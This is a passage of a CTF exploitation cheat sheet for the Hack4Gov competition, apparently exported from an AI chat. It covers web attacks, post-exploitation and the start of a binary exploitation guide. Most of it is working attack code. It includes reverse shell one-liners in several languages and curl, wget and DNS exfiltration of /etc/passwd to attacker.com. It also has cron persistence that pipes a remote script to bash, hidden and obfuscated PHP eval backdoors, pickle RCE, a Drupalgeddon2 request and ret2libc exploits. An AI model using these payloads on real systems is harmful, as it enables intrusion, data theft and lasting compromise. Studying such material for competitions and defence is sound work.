file:///etc/passwd
gopher://127.0.0.1:80/_GET / HTTP/1.1%0D%0A
dict://127.0.0.1:6379/INFO
ftp://127.0.0.1:21
tftp://127.0.0.1:69/boot.cfg
ldap://127.0.0.1:389
jar:http://127.0.0.1!/
ssh://127.0.0.1:22
```

#### SSRF Filter Bypass

```python
# URL encoding
http://127.0.0.1 -> http%3A%2F%2F127.0.0.1

# Double URL encoding
http://127.0.0.1 -> http%253A%252F%252F127.0.0.1

# Decimal IP
http://2130706433/  # 127.0.0.1

# Hexadecimal IP
http://0x7f000001/  # 127.0.0.1

# Octal IP
http://017700000001/  # 127.0.0.1

# DNS rebinding
# Use service like nip.io or xip.io
http://127.0.0.1.nip.io

# URL redirection
http://attacker.com/redirect.php?url=http://169.254.169.254

# URL shorteners
http://bit.ly/[shortened_internal_url]
```

### Blind SSRF

```bash
# DNS lookup
http://$(whoami).attacker.com/

# HTTP callback
http://attacker.com/ssrf?data=$(cat /etc/passwd | base64)

# Time-based detection
http://127.0.0.1:22 (measure response time for open/closed ports)
```

---

## Insecure Deserialization

### PHP Deserialization

#### Object Injection

```php
// Vulnerable code example
class User {
    public $name;
    public $isAdmin = false;
}
$user = unserialize($_COOKIE['user']);

// Exploit - Create malicious serialized object
O:4:"User":2:{s:4:"name";s:5:"admin";s:7:"isAdmin";b:1;}
```

#### Magic Methods Exploitation

```php
// POP chain construction
class File {
    public $filename;
    
    function __destruct() {
        unlink($this->filename);
    }
    
    function __wakeup() {
        include($this->filename);
    }
    
    function __toString() {
        return file_get_contents($this->filename);
    }
}

// Payload generation
$obj = new File();
$obj->filename = "/etc/passwd";
echo serialize($obj);
// O:4:"File":1:{s:8:"filename";s:11:"/etc/passwd";}
```

### Java Deserialization

#### Detection

```
# Look for serialized Java objects (base64 encoded)
rO0AB...
AC ED 00 05 (hex signature)

# Common vulnerable endpoints
/invoker/JMXInvokerServlet
/invoker/EJBInvokerServlet
```

#### Exploitation with ysoserial

```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" | base64

# Common gadget chains
CommonsCollections1-7
Spring1-2
Groovy1
JBoss
JSON1
```

### Python Deserialization

```python
import pickle
import base64
import os

# Create malicious pickle
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(RCE()))
print(payload)
```

### .NET Deserialization

```bash
# Using ysoserial.net
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"

# ViewState deserialization
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe -c calc"
```

---

## JWT Attacks

### JWT Structure Analysis

```javascript
// Decode JWT
header.payload.signature

// Decode parts
atob('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9')
// {"alg":"HS256","typ":"JWT"}
```

### Common JWT Vulnerabilities

#### None Algorithm

```javascript
// Change algorithm to none
{
  "alg": "none",
  "typ": "JWT"
}

// Remove signature
header.payload.
```

#### Algorithm Confusion (RS256 to HS256)

```python
import jwt
import base64

# Get public key (from certificate or jwks endpoint)
public_key = open('public.pem').read()

# Create token signed with public key as HMAC secret
token = jwt.encode(
    {"user": "admin", "role": "admin"},
    public_key,
    algorithm="HS256"
)
```

#### Weak Secret

```bash
# Brute force with jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." [alphabet] [max_length]

# Using hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Using John the Ripper
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
```

#### Kid Parameter Injection

```json
// SQL Injection in kid
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key' UNION SELECT 'secret'-- "
}

// Path traversal
{
  "kid": "../../../../../../dev/null"
}

// Command injection
{
  "kid": "key|touch /tmp/pwned"
}
```

### JWT Tools

```bash
# jwt_tool
python3 jwt_tool.py [token] -X a  # None algorithm
python3 jwt_tool.py [token] -X k -pk public.pem  # Key confusion
python3 jwt_tool.py [token] -C -d wordlist.txt  # Crack secret

# JWT Editor Burp Extension
# Provides GUI for JWT manipulation
```

---

## API Testing

### API Enumeration

```bash
# Discover API endpoints
ffuf -u http://api.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Common API paths
/api/
/api/v1/
/api/v2/
/api/users
/api/admin
/api/swagger
/api/docs
/api-docs/
/swagger.json
/swagger-ui.html
/openapi.json
```

### REST API Testing

#### HTTP Method Testing

```bash
# Test all methods
for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE; do
  curl -X $method http://api.target.com/endpoint
done

# Method override headers
X-HTTP-Method-Override: PUT
X-HTTP-Method: DELETE
X-Method-Override: PATCH
```

#### API Authentication Bypass

```
# Remove authentication headers
# Try without: Authorization, X-API-Key, Cookie

# Use different auth methods
Authorization: Bearer null
Authorization: Bearer undefined
Authorization: Bearer <invalid>

# Parameter pollution
/api/user?id=1&id=2

# Version downgrade
/api/v2/admin -> /api/v1/admin
```

### GraphQL Exploitation

#### Introspection Query

```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

#### GraphQL Injection

```graphql
# SQL injection in GraphQL
{
  user(id: "1' OR '1'='1") {
    name
    email
  }
}

# Batching attack
[
  {"query": "query { user(id: 1) { password } }"},
  {"query": "query { user(id: 2) { password } }"},
  {"query": "query { user(id: 3) { password } }"}
]
```

### API Rate Limiting Bypass

```bash
# Rotate headers
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1

# Case variations
/API/endpoint
/Api/endpoint
/aPi/endpoint

# Add trailing characters
/api/endpoint/
/api/endpoint//
/api/endpoint/..;/
```

---

## CMS Exploitation

### WordPress

#### Enumeration Scripts

```bash
# Users enumeration
curl -s http://target.com/?author=1 | grep -E 'Location:|author'
for i in {1..10}; do curl -s http://target.com/?author=$i | grep author; done

# Theme and plugin detection
curl -s http://target.com/ | grep -E 'wp-content/themes/|wp-content/plugins/'

# Version detection
curl -s http://target.com/wp-links-opml.php | grep generator
curl -s http://target.com/feed/ | grep generator
```

#### WordPress Exploitation

```bash
# Vulnerable plugins database
searchsploit wordpress
wpvulndb.com

# Common vulnerable plugins
- RevSlider (Arbitrary File Download)
- GravityForms (SQL Injection)
- WP File Manager (RCE)
- Contact Form 7 (File Upload)

# XML-RPC exploitation
# Brute force
curl -X POST -d @xmlrpc_bruteforce.xml http://target.com/xmlrpc.php

# DDoS amplification
curl -X POST -d @xmlrpc_multicall.xml http://target.com/xmlrpc.php
```

### Joomla

#### Version Detection

```bash
# README file
curl -s http://target.com/README.txt

# Manifest files
curl -s http://target.com/administrator/manifests/files/joomla.xml | grep '<version>'

# Language files
curl -s http://target.com/language/en-GB/en-GB.xml | grep version
```

#### Joomla Exploitation

```bash
# Common vulnerabilities
- com_fields SQL Injection (3.7.0)
- com_users SQL Injection
- Joomla Object Injection

# Administrator URL
/administrator/index.php

# Configuration file
configuration.php
configuration.php.bak
```

### Drupal

#### Drupalgeddon Exploits

```bash
# Drupalgeddon2 (CVE-2018-7600)
curl -X POST -H "Content-Type: application/hal+json" \
  -d '{"_links":{"type":{"href":"http://target.com/rest/type/node/page"}},"type":[{"target_id":"page"}],"title":[{"value":"test"}],"body":[{"value":"<?php system(\"id\"); ?>"}]}' \
  http://target.com/node?_format=hal_json

# Drupalgeddon3 (CVE-2018-7602)
# Requires authenticated user
```

#### Drupal Enumeration

```bash
# Version detection
/CHANGELOG.txt
/core/CHANGELOG.txt

# User enumeration
/user/1
/user/2

# Hidden paths
/node/1
/admin/reports/status
```

---

## WAF Bypass Techniques

### SQL Injection WAF Bypass

```sql
-- Whitespace alternatives
SELECT/*comment*/column/**/FROM/**/table
SELECT(column)FROM(table)
SELECT%09column%09FROM%09table  -- Tab
SELECT%0Acolumn%0AFROM%0Atable  -- Newline

-- Keyword obfuscation
SeLeCt * FrOm users
REVERSE(CONCAT('tceles')) -- SELECT reversed
/*!SELECT*/ * /*!FROM*/ users  -- MySQL specific

-- Function alternatives
CONCAT() -> CONCAT_WS()
MID() -> SUBSTR(), SUBSTRING()
@@version -> VERSION()

-- Encoding
%53%45%4C%45%43%54  -- URL encoding
0x53454C454354      -- Hex encoding

-- Scientific notation
1e0 = 1
1.e0 = 1.0
```

### XSS WAF Bypass

```javascript
// Unicode normalization
＜script＞alert(1)＜/script＞

// HTML5 entities
&lt;script&gt;alert(1)&lt;/script&gt;

// Mixed encoding
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

// Uncommon tags and events
<details open ontoggle=alert(1)>
<meter onmouseover=alert(1)>1</meter>

// JSFuck
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]

// DOM clobbering
<img id=alert src=x onerror=eval(id)>
```

### Generic WAF Bypass Strategies

```
# HTTP Parameter Pollution
/page?id=1&id=' OR '1'='1

# HTTP Method Override
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE

# Content-Type manipulation
Content-Type: application/x-www-form-urlencoded; charset=ibm037

# Chunked encoding
Transfer-Encoding: chunked

# Headers bypass
X-Forwarded-Host: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1

# Case sensitivity bypass
/Admin vs /admin vs /ADMIN

# Path normalization
/./admin
/admin/.
/admin//
/admin/./
/admin/../admin
```

---

## Specialized Attacks

### LDAP Injection

```
# Authentication bypass
username: *
password: *

username: admin)(&)
password: any

# Data extraction
username: admin*
username: a*
username: ad*

# Blind LDAP injection
(&(username=admin)(password=*))  -- Check if admin exists
(&(username=admin)(password=a*)) -- Check if password starts with 'a'
```

### XPATH Injection

```xml
# Authentication bypass
username: ' or '1'='1
password: ' or '1'='1

username: admin' or '1'='1' or 'a'='a
password: any

# Data extraction
'] | //user[userid='2
' or count(//user)>0 or '
```

### Server-Side Template Injection (SSTI)

#### Detection

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{{7*'7'}}
```

#### Exploitation Examples

**Jinja2 (Python)**

```python
{{config}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}
```

**Twig (PHP)**

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

**FreeMarker (Java)**

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

### Race Conditions

#### File Upload Race

```python
import threading
import requests

def upload():
    files = {'file': open('shell.php', 'rb')}
    requests.post('http://target/upload', files=files)

def access():
    requests.get('http://target/uploads/shell.php?cmd=id')

# Race condition
for i in range(100):
    threading.Thread(target=upload).start()
    threading.Thread(target=access).start()
```

#### TOCTOU (Time-of-Check Time-of-Use)

```bash
# Symlink race
ln -sf /etc/passwd /tmp/file
# Between check and use, change symlink
ln -sf /home/user/.ssh/authorized_keys /tmp/file
```

---

## Post-Exploitation

### Web Shell Upgrades

#### Reverse Shell One-Liners

```bash
# Bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'

# Netcat
nc -e /bin/bash attacker_ip 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker_ip 4444 >/tmp/f

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("attacker_ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="attacker_ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker_ip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Interactive Shell Upgrade

```bash
# Python PTY
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Then:
Ctrl+Z
stty raw -echo
fg
export TERM=xterm
```

### Data Exfiltration

#### DNS Exfiltration

```bash
# Using nslookup
cat /etc/passwd | xxd -p | while read line; do nslookup $line.attacker.com; done

# Using dig
cat /etc/passwd | base64 | tr -d '\n' | fold -w 63 | while read line; do dig $line.attacker.com; done
```

#### HTTP Exfiltration

```bash
# Using curl
curl -X POST -d @/etc/passwd http://attacker.com/

# Using wget
wget --post-file=/etc/passwd http://attacker.com/
```

### Persistence

#### Web Shell Persistence

```php
// Hidden in legitimate file
<?php
// Normal code here
if(isset($_REQUEST['x'])) { @eval($_REQUEST['x']); }
// More normal code
?>

// Obfuscated backdoor
<?php @$_[]=@!+_; $__=@${_}>>$_;$_[]=$__;$_[]=@_;$_[((1<<1<<1<<1<<1<<1)+(1<<1<<1<<1<<1)+(1<<1<<1<<1)+(1<<1<<1)+(1<<1)+(1))].=$_; ?>
```

#### Cron Job Persistence

```bash
# Add to crontab
echo "* * * * * curl http://attacker.com/shell.sh | bash" | crontab -

# Web application cron
echo "<?php system('nc -e /bin/bash attacker_ip 4444'); ?>" > /var/www/html/cron.php
```

---

## CTF-Specific Tips

### Flag Hunting Techniques

#### Common Flag Locations

```bash
# Files
/flag.txt
/flag
/home/*/flag.txt
/root/flag.txt
/var/www/html/flag.txt
/tmp/flag.txt

# Environment variables
env | grep -i flag
printenv | grep -i flag

# Database
SELECT * FROM flags;
SELECT * FROM users WHERE username='flag';

# Comments in source code
grep -r "flag{" /var/www/
grep -r "CTF{" /var/www/
```

#### Flag Format Recognition

```
flag{...}
CTF{...}
FLAG{...}
flag_...
hack4gov{...}
h4g{...}
```

### CTF Web Challenge Categories

#### Authentication Challenges

- Default credentials
- SQL injection login bypass
- Weak session tokens
- JWT vulnerabilities
- Password reset flaws

#### File Challenges

- LFI/RFI to read flag file
- File upload to get shell
- Hidden backup files (.bak, .swp)
- Git/SVN exposure

#### Injection Challenges

- SQL injection for database flags
- Command injection for system flags
- SSTI for code execution
- XXE for file reading

#### Client-Side Challenges

- JavaScript obfuscation
- Hidden values in HTML
- Cookies and localStorage
- WebAssembly reversing

### Automation Scripts

#### Quick Enumeration Script

```bash
#!/bin/bash
TARGET=$1

echo "[+] Running initial enumeration on $TARGET"

# Port scan
nmap -sV -sC -p- --min-rate=1000 $TARGET -oN nmap.txt

# Directory enumeration
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -o gobuster.txt

# Nikto scan
nikto -h http://$TARGET -output nikto.txt

# Technology detection
whatweb -a 3 http://$TARGET | tee whatweb.txt

echo "[+] Enumeration complete. Check output files."
```

#### Flag Finder Script

```python
#!/usr/bin/env python3
import re
import requests
from bs4 import BeautifulSoup

def find_flags(url):
    patterns = [
        r'flag\{[^}]+\}',
        r'CTF\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'hack4gov\{[^}]+\}'
    ]
    
    response = requests.get(url)
    
    # Check response body
    for pattern in patterns:
        matches = re.findall(pattern, response.text)
        for match in matches:
            print(f"[+] Found flag: {match}")
    
    # Check headers
    for header, value in response.headers.items():
        for pattern in patterns:
            matches = re.findall(pattern, value)
            for match in matches:
                print(f"[+] Found flag in {header}: {match}")
    
    # Check HTML comments
    soup = BeautifulSoup(response.text, 'html.parser')
    comments = soup.find_all(string=lambda text: isinstance(text, Comment))
    for comment in comments:
        for pattern in patterns:
            matches = re.findall(pattern, comment)
            for match in matches:
                print(f"[+] Found flag in comment: {match}")
```

### Quick Wins Checklist

1. **[Unverified]** Check robots.txt, sitemap.xml, .git, .svn
2. **[Unverified]** View source for comments and hidden inputs
3. **[Unverified]** Check cookies and local storage
4. **[Unverified]** Test for default credentials (admin:admin, admin:password)
5. **[Unverified]** Look for backup files (.bak, .old, ~)
6. **[Unverified]** Check HTTP response headers for information
7. **[Unverified]** Test basic SQL injection on all parameters
8. **[Unverified]** Check for directory listings
9. **[Unverified]** Look for API documentation (/api, /swagger)
10. **[Unverified]** Test for common vulnerabilities based on technology stack

---

## Additional Resources & Tools

### Essential Wordlists

```
# SecLists (most comprehensive)
/usr/share/seclists/Discovery/Web-Content/
/usr/share/seclists/Passwords/
/usr/share/seclists/Usernames/
/usr/share/seclists/Fuzzing/

# Platform-specific
/usr/share/wordlists/wfuzz/
/usr/share/wordlists/dirb/
/usr/share/wordlists/dirbuster/

# Custom wordlist generation
cewl http://target.com -m 5 -w custom.
```

---

# Binary Exploitation/Pwn

_Comprehensive guide for PH Hack4Gov and other CTF competitions_

## Table of Contents

1. [Initial Reconnaissance](https://claude.ai/chat/b7865566-e56e-4e5f-bda2-b5dfa5114fd3#initial-reconnaissance)
2. [Security Mechanisms](https://claude.ai/chat/b7865566-e56e-4e5f-bda2-b5dfa5114fd3#security-mechanisms)
3. [Vulnerability Classes](https://claude.ai/chat/b7865566-e56e-4e5f-bda2-b5dfa5114fd3#vulnerability-classes)
4. [Exploitation Techniques](https://claude.ai/chat/b7865566-e56e-4e5f-bda2-b5dfa5114fd3#exploitation-techniques)
5. [Advanced Techniques](https://claude.ai/chat/b7865566-e56e-4e5f-bda2-b5dfa5114fd3#advanced-techniques)
6. [Tools & Commands](https://claude.ai/chat/b7865566-e56e-4e5f-bda2-b5dfa5114fd3#tools--commands)
7. [Pwntools Framework](https://claude.ai/chat/b7865566-e56e-4e5f-bda2-b5dfa5114fd3#pwntools-framework)
8. [GDB Debugging](https://claude.ai/chat/b7865566-e56e-4e5f-bda2-b5dfa5114fd3#gdb-debugging)
9. [Common Exploit Scenarios](https://claude.ai/chat/b7865566-e56e-4e5f-bda2-b5dfa5114fd3#common-exploit-scenarios)
10. [Shellcoding](https://claude.ai/chat/b7865566-e56e-4e5f-bda2-b5dfa5114fd3#shellcoding)
11. [Heap Exploitation](https://claude.ai/chat/b7865566-e56e-4e5f-bda2-b5dfa5114fd3#heap-exploitation)
12. [Format String Exploitation](https://claude.ai/chat/b7865566-e56e-4e5f-bda2-b5dfa5114fd3#format-string-exploitation)
13. [ROP & Advanced Techniques](https://claude.ai/chat/b7865566-e56e-4e5f-bda2-b5dfa5114fd3#rop--advanced-techniques)
14. [Quick Reference Tables](https://claude.ai/chat/b7865566-e56e-4e5f-bda2-b5dfa5114fd3#quick-reference-tables)
15. [CTF Strategy & Tips](https://claude.ai/chat/b7865566-e56e-4e5f-bda2-b5dfa5114fd3#ctf-strategy--tips)

---

## 1. Initial Reconnaissance

### File Analysis Commands

```bash
# Basic file information
file <binary>                    # Identify file type (ELF 32/64-bit, stripped, etc.)
strings <binary> | less          # Extract readable strings
strings -n 10 <binary>           # Strings with min 10 characters
rabin2 -I <binary>               # Radare2 binary info

# Dynamic analysis
ldd <binary>                     # List dynamic dependencies
readelf -d <binary>              # Dynamic section info
strace ./<binary>                # Trace system calls
strace -e open,read,write ./<binary>  # Filter specific syscalls
ltrace ./<binary>                # Trace library calls
ltrace -f ./<binary>             # Follow child processes

# Symbol analysis
nm <binary>                      # List symbols
nm -D <binary>                   # Dynamic symbols only
objdump -t <binary>              # Symbol table
readelf -s <binary>              # Symbol table (alternative)
objdump -T <binary>              # Dynamic symbol table

# Disassembly
objdump -d <binary>              # Disassemble all
objdump -d -M intel <binary>     # Intel syntax
objdump -d -j .text <binary>     # Only .text section
r2 -A <binary>                   # Radare2 analysis
```

### Binary Sections Analysis

```bash
readelf -S <binary>              # List all sections
readelf -x .rodata <binary>      # Hex dump of section
objdump -s -j .data <binary>     # Dump .data section
readelf -p .comment <binary>     # String dump of section

# Important sections:
# .text    - Executable code
# .data    - Initialized global variables
# .bss     - Uninitialized global variables
# .rodata  - Read-only data (strings, constants)
# .got     - Global Offset Table
# .plt     - Procedure Linkage Table
```

---

## 2. Security Mechanisms

### Checksec Output Interpretation

```bash
checksec --file=<binary>
# or
pwn checksec <binary>
```

### Protection Mechanisms Detailed

#### **Stack Canaries (SSP - Stack Smashing Protector)**

- **Purpose**: Detect stack buffer overflows before function returns
- **Implementation**: Random value placed between local variables and saved return address
- **Bypass Methods**:
    - Leak the canary value through format string or other info leak
    - Brute force byte-by-byte (fork-based servers)
    - Overwrite without touching canary (e.g., only overwrite local vars)
    - Target exception handlers before canary check

#### **NX Bit (No-Execute/DEP)**

- **Purpose**: Prevent code execution from writable memory regions
- **Implementation**: CPU-level protection marking pages as non-executable
- **Bypass Methods**:
    - Return-to-libc (ret2libc)
    - Return Oriented Programming (ROP)
    - Jump Oriented Programming (JOP)
    - Use existing executable code

#### **ASLR (Address Space Layout Randomization)**

- **Levels**:
    - 0: Disabled
    - 1: Randomize stack, vdso, shared libraries
    - 2: Full randomization (including heap, brk)
- **Check/Modify**:
    
    ```bash
    cat /proc/sys/kernel/randomize_va_spaceecho 0 | sudo tee /proc/sys/kernel/randomize_va_space  # Disable for testing
    ```
    
- **Bypass Methods**:
    - Information leaks to calculate base addresses
    - Partial overwrites (lower 12 bits stay constant)
    - Brute force on 32-bit systems
    - Use non-randomized regions

#### **PIE (Position Independent Executable)**

- **Purpose**: Randomize binary's base address
- **Impact**: All addresses become relative
- **Bypass Methods**:
    - Leak binary base address
    - Use PLT/GOT for function calls
    - Partial overwrites

#### **RELRO (Relocation Read-Only)**

- **Partial RELRO**:
    - GOT is writable
    - Can overwrite GOT entries
- **Full RELRO**:
    - GOT becomes read-only after initialization
    - All symbols resolved at startup
    - Performance impact due to eager binding
- **Exploitation Impact**:
    - Partial: GOT overwrite possible
    - Full: Need different techniques (can't overwrite GOT)

#### **Fortify Source**

- **Purpose**: Compile-time buffer overflow detection
- **Implementation**: Replace unsafe functions with safer versions
- **Example**: `strcpy` → `__strcpy_chk`
- **Bypass**: Find bugs in non-fortified functions

---

## 3. Vulnerability Classes

### Buffer Overflow Vulnerabilities

#### Dangerous Functions Reference

```c
// Never safe - No bounds checking
gets(buffer);                    // Reads until newline
strcpy(dest, src);              // Copies until null byte
strcat(dest, src);              // Appends until null byte
sprintf(buffer, format, ...);    // No size limit

// Potentially unsafe - Require careful use
scanf("%s", buffer);            // No width specifier
fscanf(file, "%s", buffer);     // No width specifier
sscanf(input, "%s", buffer);    // No width specifier
vsprintf(buffer, format, args); // No size limit

// Incorrectly used "safe" functions
strncpy(dest, src, n);          // Doesn't null-terminate if src >= n
strncat(dest, src, n);          // Misunderstood 'n' parameter
fgets(buffer, size, stream);    // Off-by-one if not careful
snprintf(buffer, size, ...);    // Return value often unchecked

// Memory functions
memcpy(dest, src, n);           // No overlap check
memmove(dest, src, n);          // Safe for overlap but no bounds check
bcopy(src, dest, n);            // Deprecated, no bounds check

// Wide character functions
wcscpy(dest, src);              // Wide char version, same issues
wcscat(dest, src);              // Wide char concatenation
```

### Integer Vulnerabilities

```c
// Integer overflow
size_t size = user_input;
char *buffer = malloc(size + 1);  // Can overflow to small value

// Sign confusion
int len = user_input;
if (len > MAX_SIZE) return;       // Negative passes check
memcpy(dest, src, len);           // Interprets as huge unsigned

// Width conversion
int32_t large = 0x100000001;
int16_t small = large;            // Truncation
```

### Use-After-Free (UAF)

```c
char *ptr = malloc(100);
free(ptr);
// ... more code ...
strcpy(ptr, "data");              // UAF vulnerability
```

### Double Free

```c
free(ptr);
// ... some condition ...
free(ptr);                        // Double free
```

### Off-by-One Errors

```c
char buffer[10];
for(int i = 0; i <= 10; i++) {   // Should be i < 10
    buffer[i] = 'A';
}
```

---

## 4. Exploitation Techniques

### Stack-Based Exploitation

#### Finding Offset to RIP/EIP

```python
# Method 1: Cyclic pattern
from pwn import *
pattern = cyclic(500)
# Send pattern, check where it crashes
offset = cyclic_find(0x61616161)  # Replace with actual value

# Method 2: Manual
# Send A's incrementally until segfault
for i in range(1, 1000):
    payload = b'A' * i
    # Test and find crash point
```

#### Basic Stack Overflow Exploit

```python
from pwn import *

# Setup
binary = './vuln'
elf = ELF(binary)
p = process(binary)

# Find addresses
win_addr = elf.symbols['win_function']  # If exists
got_puts = elf.got['puts']              # GOT entry
plt_puts = elf.plt['puts']              # PLT entry

# Basic payload structure
padding = b'A' * offset
rbp = b'B' * 8          # 64-bit (use 4 for 32-bit)
return_addr = p64(win_addr)  # p32() for 32-bit

payload = padding + rbp + return_addr
```

### Return-to-libc (ret2libc)

#### Complete ret2libc Attack

```python
from pwn import *

# Setup
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local libc
p = process('./vuln')

# Step 1: Leak libc address
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')  # Return to main for second payload

payload = b'A' * offset + rop.chain()
p.sendline(payload)

# Parse leak
leaked = u64(p.recvline()[:6].ljust(8, b'\x00'))
libc_base = leaked - libc.symbols['puts']
log.success(f'Libc base: {hex(libc_base)}')

# Step 2: Get shell
libc.address = libc_base
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))

# For 64-bit, need to align stack and set rdi
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload2 = b'A' * offset
payload2 += p64(ret)        # Stack alignment
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(system)

p.sendline(payload2)
p.interactive()
```

### One-Gadget RCE

```bash
# Find one-gadget RCE in libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# Use in exploit
one_gadget_offset = 0x4526a  # Example offset
one_gadget = libc_base + one_gadget_offset
payload = b'A' * offset + p64(one_gadget)
```

---

## 5. Advanced Techniques

### Stack Pivoting

```python
# When stack space is limited
# Find gadgets to move stack pointer
leave_ret = 0x400800  # mov rsp, rbp; pop rbp; ret
pop_rsp = 0x400900    # pop rsp; ret

# Pivot to controlled area
new_stack = 0x601000  # Writable area with our ROP chain
payload = b'A' * offset
payload += p64(new_stack)  # New RBP
payload += p64(leave_ret)  # Trigger pivot
```

### SIGROP (Signal Return Oriented Programming)

```python
# Exploit sigreturn to control all registers
from pwn import *

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rsp = writable_addr
frame.rip = syscall_gadget

payload = b'A' * offset
payload += p64(pop_rax) + p64(constants.SYS_rt_sigreturn)
payload += p64(syscall_gadget)
payload += bytes(frame)
```

### House of Force (Heap)

```python
# Overwrite top chunk size
# Force malloc to return arbitrary address
wilderness_size = -1  # 0xffffffffffffffff
target_addr = 0x601020  # GOT entry

# Calculate allocation size
alloc_size = target_addr - current_heap_top - 0x10
```

---

## 6. Tools & Commands

### Essential Tools Installation

```bash
# Pwntools
pip3 install pwntools

# GDB enhancers (choose one)
# Pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# GEF
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# PEDA
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# ROPgadget
pip3 install ropgadget

# One_gadget
gem install one_gadget

# Seccomp-tools
gem install seccomp-tools

# Radare2
git clone https://github.com/radareorg/radare2
cd radare2 && sys/install.sh

# Ropper
pip3 install ropper

# Keystone (assembler)
pip3 install keystone-engine

# Capstone (disassembler)
pip3 install capstone
```

### Quick Commands Reference

```bash
# Find strings with addresses
rabin2 -z <binary>

# Search for gadgets
ROPgadget --binary <binary> --only "pop|ret"
ropper --file <binary> --search "pop rdi"

# Check seccomp rules
seccomp-tools dump ./<binary>

# Patch binary
radare2 -w <binary>
> s 0x400800
> wx 9090  # Write NOPs

# Generate shellcode
msfvenom -p linux/x64/exec CMD=/bin/sh -f python
pwn shellcraft amd64.linux.sh  # Pwntools shellcode

# Trace library calls with specific functions
ltrace -e malloc+free+strcpy ./<binary>

# Find writable sections
readelf -S <binary> | grep -E "WA|WAX"
```

---

## 7. Pwntools Framework

### Complete Pwntools Template

```python
#!/usr/bin/env python3
from pwn import *
import sys

# ==================== Configuration ====================
BINARY = './challenge'
HOST = 'ctf.example.com'
PORT = 1337
LIBC = './libc.so.6'  # If provided

# Context setup
context.binary = elf = ELF(BINARY)
context.log_level = 'debug'  # Change to 'info' for less output
context.terminal = ['tmux', 'splitw', '-h']  # For gdb.attach

# Architecture specific
if elf.arch == 'amd64':
    context.arch = 'amd64'
    pack_func = p64
    unpack_func = u64
else:
    context.arch = 'i386'
    pack_func = p32
    unpack_func = u32

# ==================== Helper Functions ====================
def start():
    """Start process or remote connection"""
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process([elf.path])

def send_payload(payload):
    """Send payload with optional encoding"""
    if args.ENCODE:
        payload = payload.encode('latin-1')
    p.sendline(payload)

def leak_address(func_name):
    """Generic address leaking"""
    rop = ROP(elf)
    
    # Leak function address
    if elf.arch == 'amd64':
        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
        payload = flat({
            offset: [
                pop_rdi,
                elf.got[func_name],
                elf.plt['puts'],
                elf.symbols['main']
            ]
